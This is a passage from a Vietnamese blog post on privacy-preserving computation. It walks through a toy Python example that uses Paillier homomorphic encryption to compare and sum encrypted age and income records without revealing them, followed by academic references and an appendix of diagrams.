<p class="">Alice bằng việc sử dụng random <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_2943eb743cec6d95e34639874f2d6a27.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> khiến cho Bob không biết đường nào mà lần, dù anh có giải mã ra a mũ và b ngã thì vẫn không đoán được a,b là gì. Tuy nhiên cũng xin lưu ý ở đây rằng, để đảm bảo giao thức hoạt động ngon thì random cần có một độ dài k bits cần thiết nhé. Lúc implement bị hack thì đừng đổ cho chụy không nói trước <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?ssl=1"><img data-attachment-id="580" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/look_down/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="look_down" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-580" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?resize=25%2C25&#038;ssl=1" alt="look_down" width="25" height="25" data-recalc-dims="1" /></a>.</p>
<p class=""><strong>5. Ví dụ ứng dụng</strong></p>
<p class="">Phần này với bạn đọc nào hiểu rõ học thuật rồi có thể skip sang luôn phần like subcribe comment và share trên phây búc. Dưới đây chỉ là bài toán ví dụ đơn giản trẻ con sử dụng Pailler để bảo vệ các thông tin như: tuổi, thu nhập bằng Python.</p>
<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?ssl=1"><img data-attachment-id="581" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-10/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" data-orig-size="561,312" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=300%2C167&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" class="alignnone size-full wp-image-581" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=561%2C312&#038;ssl=1" alt="Untitled" width="561" height="312" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?w=561&amp;ssl=1 561w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=300%2C167&amp;ssl=1 300w" sizes="(max-width: 561px) 100vw, 561px" data-recalc-dims="1" /></a></p>
<p class="">Đầu tiên, giả sử tôi có một hệ cơ sở dữ liệu cần mã hóa Paillier với 3 cột: Tên, tuổi, thu nhập. Tôi xin ăn cắp thư viện Pure Python Paillier Homomorphic Cryptosystem (3) để mã hóa dưới đây:</p>
<pre class="lang:python decode:true">from paillier.paillier import *
from timer import Timer
import random,string

def encrypt_db():
	print "Encrypting...."
	for p in session.query(Person):
		p.age = str(encrypt(pub, int(p.age)))
		p.income = str(encrypt(pub, int(p.income)))
		p.name = str(int(p.name.encode("hex"),16))
	session.commit()

def decrypt_db():
	print "Decrypting...."
	for p in session.query(Person):
		print decrypt(priv, pub, int(p.age)) ,decrypt(priv, pub, int(p.income)) , hex(decrypt(priv, pub, int(p.name ))).replace("0x","").replace("L","")

print "Generating keypair..."
priv, pub =  generate_keypair(2048)
</pre>
<p>Với quyền query lên database toàn bộ bị mã hóa, tôi có 2 bài toán cần giải quyết đó là:</p>
<ul>
<li>Nhập lên một số <em>x</em>, yêu cầu trả lời câu hỏi có bao nhiêu người có độ tuổi lớn hơn x mà không làm lộ số <em>x</em> đang được hỏi.</li>
<li>Tính tổng thu nhập của tất cả những người có độ tuổi lớn hơn x mà không làm lộ thông tin thu nhập của từng người.</li>
</ul>
<p>Đề giải quyết 2 bài toán trên, tôi tham khảo giao thức tính toán không làm lộ dữ liệu được cải tiến của Zerkin (4) bạn tôi như sau:</p>
<p><img class="alignnone size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/u.jpg?resize=604%2C958&#038;ssl=1" alt="" width="604" height="958" data-recalc-dims="1" /></p>
<p>Hàm gửi lên để lấy kết quả ta chỉ cần quan tâm tới hàm A(pub, enc_a, enc_b). Ở đây được code như sau (code bừa hơi dài đề nghị không gạch đá <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-586" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=27%2C27&#038;ssl=1" alt="beat_brick" width="27" height="27" data-recalc-dims="1" /></a>):</p>
<pre class="lang:python decode:true ">from paillier.paillier import *
import random,string

l=17
def A(pub, enc_a, enc_b):
	enc_z = e_add(pub, e_add(pub, enc_a, encrypt(pub, 2**l)), invmod(enc_b,pub.n_sq))
	r = random.randrange(2**(80+l+1))

	r_bin = bin(r).replace("0b","").replace("L","")
	r_bin = "0"* (l-len(r_bin))+r_bin
	r_bin = r_bin[::-1]
	enc_r = encrypt(pub, r)
	enc_d = e_add(pub, enc_z , enc_r)
	enc_d1, enc_d2 , enc_t = B1(enc_d)
	s = [-1,1][random.randint(0,1)]

	h = [0]*l
	v = [0]*l
	enc_c = [0]*l
	enc_e = [0]*l
	for i in range(l):
		while True:
			h[i] = random.getrandbits(long(round(math.log(pub.n, 2))))
			if h[i] &gt; 0 and h[i] &lt; pub.n and gcd(h[i], pub.n) == 1:
				break

	for i in range(l):
		v[i] = s - int(r_bin[i])
		for j in range(i+1,l):
			v[i] -= (2**j) * int(r_bin[j])
		if v[i] &lt; 0: 
			v[i] = pub.n + v[i]
		enc_c[i] = e_add(pub, encrypt(pub, v[i]), enc_t[i])
		enc_e[i] = pow (enc_c[i], h[i],pub.n_sq)

	enc_lamda = B2(enc_e)
	if s != 1:
		enc_lamda = e_add(pub, encrypt(pub,1), invmod(enc_lamda,pub.n_sq))
	enc_zl = e_add(pub, e_add(pub, enc_d2, invmod(encrypt(pub,(r / 2**l)),pub.n_sq)), invmod(enc_lamda,pub.n_sq))
	return B3(enc_zl)

def B1(enc_d):
	d= decrypt(priv, pub, enc_d)
	d1 = d%(2**l)
	d2 = d/(2**l)
	d_bin = bin(d1).replace("0b","").replace("L","")
	d_bin = "0"* (l-len(d_bin))+d_bin
	d_bin = d_bin[::-1]
	t = [int(0)]*l
	for i in range(l):
		t[i] = int(d_bin[i])
		for j in range(i+1,l):
			t[i] += (2**j) * int(d_bin[j])
		t[i] = encrypt(pub, t[i])
	return encrypt(pub,d1) , encrypt(pub,d2),t
def B2(enc_e):
	e = [int(0)]*l
	for i in range(l):
		e[i] = decrypt(priv, pub, enc_e[i])
		if e[i] ==0: return encrypt(pub,1)
	return encrypt(pub,0)


def B3(enc_zl):
	return decrypt(priv,pub, enc_zl)</pre>
<p>Vậy với bài toán 1, để biết bao người có số tuổi từ x đổ lên ta chỉ cần query bằng hàm A():</p>
<pre class="lang:default decode:true">index = [-1]*len(income)	
for i in range(len(age)):
	enc_x = encrypt(pub, x)
	if int(A(pub, age[i],  enc_x))&gt;0:
		index[number] = i
		number+=1</pre>
<p>Với bài toán 2, để thêm phần bảo mật ta nhét thêm một số random r thật dài vào mỗi lần query như sau:</p>
<pre class="lang:default decode:true">	r = random.randrange(2**(80+32))
	for i in index:
		if i&gt;-1:
			totalincome = e_add(pub, totalincome, income[i])
	totalincome = e_add(pub, totalincome, encrypt(pub,r))
	totalincome = decrypt(priv,pub,totalincome) - r</pre>
<p>Thật là đơn giản phải không <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>, nếu bạn vẫn chưa hiểu, xin đừng liên hệ tôi vì tôi sẽ không giải thích đâu. Xin mời bạn đọc phần appendix nhé.</p>
<ol>
<li>"Protocols for secure computations". <i>FOCS</i>. 23rd Annual Symposium on Foundations of Computer Science (FOCS 1982): 160–164.<a title="Digital object identifier" href="https://en.wikipedia.org/wiki/Digital_object_identifier">doi</a>:<a class="external text" href="https://dx.doi.org/10.1109%2FSFCS.1982.88" rel="nofollow">10.1109/SFCS.1982.88</a></li>
<li>Mã hoá đồng cấu và ứng dụng http://tapchi.vnu.edu.vn/tckh/news/?1887/635/Ma-hoa-dong-cau-va-ung-dung.htm</li>
<li>https://github.com/mikeivanov/paillier</li>
<li>Z. Erkin, M. Franz, J. Guajardo, S. Katzenbeisser, R. L. Lagendijk and T. Toft, Privacy- Preserving Face Recognition, 9th International Symposium on Privacy Enhancing Technologies, LNCS 5672, pp. 235-253, August 2009.</li>
</ol>
<h1>Appendix:</h1>
<p><strong>Ứng dụng hệ mã hóa đồng cấu trong nhận dạng hình ảnh tội phạm</strong> (vẫn đảm bảo quyền bảo vệ hệ thống hình ảnh tội phạm, cũng như không làm lộ khuôn mặt người cần kiểm tra):</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?ssl=1"><img data-attachment-id="582" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-11/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=790%2C1496&amp;ssl=1" data-orig-size="790,1496" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=158%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=541%2C1024&amp;ssl=1" class="alignnone size-full wp-image-582" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=604%2C1144&#038;ssl=1" alt="Untitled" width="604" height="1144" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?w=790&amp;ssl=1 790w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=158%2C300&amp;ssl=1 158w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=768%2C1454&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=541%2C1024&amp;ssl=1 541w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><strong>Tính toán không lộ thông tin (ghi chú phần 4)</strong></p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?ssl=1"><img data-attachment-id="583" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/av2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=1417%2C2169&amp;ssl=1" data-orig-size="1417,2169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="av2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=196%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=604%2C925&amp;ssl=1" class="alignnone size-full wp-image-583" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=604%2C925&#038;ssl=1" alt="av2" width="604" height="925" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1417&amp;ssl=1 1417w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=196%2C300&amp;ssl=1 196w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=768%2C1176&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=669%2C1024&amp;ssl=1 669w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?ssl=1"><img data-attachment-id="584" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-12/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" data-orig-size="558,158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" class="alignnone size-full wp-image-584" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=558%2C158&#038;ssl=1" alt="Untitled" width="558" height="158" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?w=558&amp;ssl=1 558w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 558px) 100vw, 558px" data-recalc-dims="1" /></a></p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">557</post-id>	</item>
	</channel>
</rss>
